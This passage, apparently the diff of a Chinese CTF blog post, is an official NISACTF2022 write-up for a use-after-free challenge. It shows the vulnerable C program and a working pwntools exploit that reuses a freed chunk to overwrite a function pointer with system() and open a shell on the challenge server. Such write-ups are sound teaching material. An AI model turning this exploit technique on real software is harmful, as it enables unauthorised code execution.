class="line">io.sendline(&quot;3&quot;) </span><br><span class="line">io.recvuntil(&quot;\n&quot;) </span><br><span class="line">io.sendline(&quot;1&quot;) </span><br><span class="line">io.recvuntil(&quot;\n&quot;) </span><br><span class="line">io.sendline(&quot;3&quot;) </span><br><span class="line">io.recvuntil(&quot;\n&quot;) </span><br><span class="line">io.sendline(&quot;1&quot;) </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>总的来说就是一题比较简单的uaf，有点考察到溢出。 </p>
+<p>先看一下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">​</span><br><span class="line">typedef struct uaf</span><br><span class="line">&#123;</span><br><span class="line">    char s[4];</span><br><span class="line">    void (*func)(char *);</span><br><span class="line">&#125;UAF;</span><br><span class="line">​</span><br><span class="line">UAF *page[10];</span><br><span class="line">int i=0;</span><br><span class="line">void echo(char s[])&#123;</span><br><span class="line">    printf(&quot;%s\n&quot;,s);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void NICO(char command[])&#123;</span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">int main()&#123;</span><br><span class="line">    setbuf(stdin, 0);</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    int i;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        puts(&quot;1.create&quot;);</span><br><span class="line">        puts(&quot;2.edit&quot;);</span><br><span class="line">        puts(&quot;3.delete&quot;);</span><br><span class="line">        puts(&quot;4.show&quot;);</span><br><span class="line">        printf(&quot;:&quot;);</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">        switch( i )&#123;</span><br><span class="line">            case 1 : create(); break;</span><br><span class="line">            case 2 : edit(); break;</span><br><span class="line">            case 3 : del(); break;</span><br><span class="line">            case 4 : show(); break;</span><br><span class="line">            default: puts(&quot;Invalid choice&quot;); break; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void create()&#123;</span><br><span class="line">    printf(&quot;you are creating the %d page\n&quot;,i);</span><br><span class="line">    if( i&gt;=0 &amp;&amp; i&lt;=9)&#123;</span><br><span class="line">        page[i] = (UAF*)malloc(sizeof(struct uaf));</span><br><span class="line">        if( i == 0)&#123;</span><br><span class="line">            strcpy(page[0]-&gt;s,&quot;giao&quot;) ;</span><br><span class="line">            page[0]-&gt;func = echo;</span><br><span class="line">            printf(&quot;The init page\n&quot;);</span><br><span class="line">            i++;&#125;</span><br><span class="line">        else if(i&gt;=1 &amp;&amp; i&lt;=9)&#123;</span><br><span class="line">            printf(&quot;Good cretation!\n&quot;);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123; printf(&quot;NO PAGE\n&quot;);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void edit()&#123;</span><br><span class="line">    int j;</span><br><span class="line">    printf(&quot;Input page\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">    if( j&gt;=1 &amp;&amp; j&lt;= i)&#123;</span><br><span class="line">        printf(&quot;Input your strings\n&quot;);</span><br><span class="line">        scanf(&quot;%s&quot;,page[j]-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123; printf(&quot;NO PAGE\n&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void del()&#123;</span><br><span class="line">    int j;</span><br><span class="line">    printf(&quot;Input page\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">    if( j&gt;=0 &amp;&amp; j&lt;= i)&#123;</span><br><span class="line">        free(page[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123; printf(&quot;NO PAGE\n&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void show()&#123;</span><br><span class="line">    int j;</span><br><span class="line">    printf(&quot;Input page\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">    if( j == 0 )&#123;</span><br><span class="line">        (page[0]-&gt;func)(page[0]-&gt;s);&#125;</span><br><span class="line">    else if(j&gt;=1 &amp;&amp; j &lt;=i)&#123;</span><br><span class="line">    echo(page[j]-&gt;s);&#125;</span><br><span class="line">    else &#123; printf(&quot;NO PAGE\n&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>定义uaf常用结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个字符串 一个函数指针</span><br></pre></td></tr></table></figure>
+
+<p>crate函数 </p>
+<p>如果是第一个创建的page[0]就直接为他赋值为giao，并且函数指针指向echo函数 不是第一个的话，就申请空间 </p>
+<p>edit函数 </p>
+<p>修改page[1-9]，但是这边就存在一个溢出，可以写到page[j]-&gt;func的空间delete函数 free掉指针的chunk，但是指针没NULL,存在uaf </p>
+<p>show </p>
+<p>如果是0页面则调用func，非0页面则调用ehco。 </p>
+<p>其实有点把饭喂到嘴边了。 明显的就是 先创建0页面，然后再释放掉0页面，再申请一个1页面。 这样被free掉的0页面的chunk进入bin后又会被1申请出来。 这2个的堆空间地址是一模一样的。这跟堆回收机制有关。详情可以看ctfwiki或者星盟安全团队的堆入 门视频。 </p>
+<p>那么刚刚page[0]-&gt;func的指针没有被NULL，那么实际上page[0]-&gt;func指向的地址变成了page[1]- &gt;func。 又因为edit只能编辑page[1-9]所以就选用edit(page[1])。通过这边的溢出修改。</p>
+<p>放上exp.py进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">​</span><br><span class="line">#io = process(&quot;./uaf&quot;)</span><br><span class="line">io = remote(&quot;1.14.71.254&quot;,28032)</span><br><span class="line">​</span><br><span class="line">def create():</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">​</span><br><span class="line">def edit(page,context):</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;Input page\n&quot;)</span><br><span class="line">    io.sendline(str(page))</span><br><span class="line">    io.recvuntil(&quot;Input your strings\n&quot;)</span><br><span class="line">    io.sendline(context)</span><br><span class="line">​</span><br><span class="line">def delete(page):</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;Input page\n&quot;)</span><br><span class="line">    io.sendline(str(page))</span><br><span class="line">    </span><br><span class="line">​</span><br><span class="line">def show(page):</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvuntil(&quot;Input page\n&quot;)</span><br><span class="line">    io.sendline(str(page))</span><br><span class="line">​</span><br><span class="line">shell = 0x08048642</span><br><span class="line">​</span><br><span class="line">create()   首先创建一个page[0]</span><br><span class="line">delete(0)然后删掉page[0]，指针没置空 </span><br><span class="line">create() 申请一个page[1],使得page[1]实际的堆空间为page[0]曾经用过的</span><br><span class="line">payload = b&quot;sh\x00\x00&quot; + p32(shell) payload 自己慢慢调试，可以先写payload= &#x27;c&#x27;*16 然后慢慢调</span><br><span class="line">edit(1,payload)往page[1]中写入payload</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">show(0)由于指针没有没有被NULL，所以调用page[0]-&gt;func 等于 page[0]- &gt;func=system（*）</span><br><span class="line">​</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>先断在第一个crate() </p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281525164.png" alt="img"></p>
+<p>可以看到成功申请了堆空间，并且赋值了一个func=echo 和 s = “giao” </p>
+<p>然后删除page[0] 再申请page[1] n到第二个create()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281525672.png" alt="img"></p>
+<p>可以看到还是0x9da6198 但是它现在是page[1]的。所以是全空的。 </p>
+<p>然后进行对page[1]edit，写入payload （我重新开一个调试，所以地址不一样)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281526896.png" alt="img"></p>
+<p>就写入了system的地址和 0x6873 = “sh” </p>
+<p>为什么不用/bin/sh 因为空间不够 </p>
+<p>最后在通过show(0) 就可以调用page[0]-&gt;func(page[0]-&gt;s)了 此时page[0]-&gt;func = system page[0]-&gt;s = “sh” </p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/04/05/ctf/NISACTF2022-officialwp/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/04/05/ctf/NISACTF2022-officialwp/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
